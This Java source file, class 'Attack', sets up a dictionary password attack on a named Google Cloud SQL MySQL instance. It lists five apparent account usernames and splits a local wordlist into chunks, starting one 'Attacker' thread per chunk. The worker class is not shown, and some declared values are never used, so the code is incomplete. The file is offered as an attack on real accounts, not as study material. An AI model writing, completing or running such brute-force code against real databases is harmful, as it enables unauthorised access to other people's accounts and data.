package ndbc;

import java.io.FileReader;
import java.io.IOException;
import java.io.LineNumberReader;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;

public class Attack {

    public static void main(String[] args) throws IOException {
        
        ArrayList<String> dict = new ArrayList<String>();
        String instanceConnectionName = "mineral-brand-148217:us-central1:first";
        String databaseName = "ndbc";
        String[] usernames = {"aborse","jbaumann", "jwilson","jyamauchi", "kbeine"};
        String password = UserData.PW;
        String jdbcUrl = String.format(
                "jdbc:mysql://google/%s?cloudSqlInstance=%s&"
                        + "socketFactory=com.google.cloud.sql.mysql.SocketFactory",
                        databaseName,
                        instanceConnectionName);
        for(int y = 2; y < 12; y++){
            dict = Reader(y);
            Attacker x = new Attacker(dict);
            x.start();
    }
}
    
    static ArrayList<String> Reader(int x) throws IOException{
        ArrayList<String> emptydict = new ArrayList<String>();
        try (LineNumberReader rdr = new LineNumberReader(new FileReader("/home/bholdridge/Documents/Dict/dict"))) {
            //StringBuilder sb1 = new StringBuilder();
            //StringBuilder sb2 = new StringBuilder();
            for (String line = null; (line = rdr.readLine()) != null;) {
                if (rdr.getLineNumber() >= 5000*x && rdr.getLineNumber() < 5000*(x+1)) {
                    if(!line.contains("'")){
                        emptydict.add(line);
                    }
                }
        }
    }
        
        return emptydict;
        
    }

}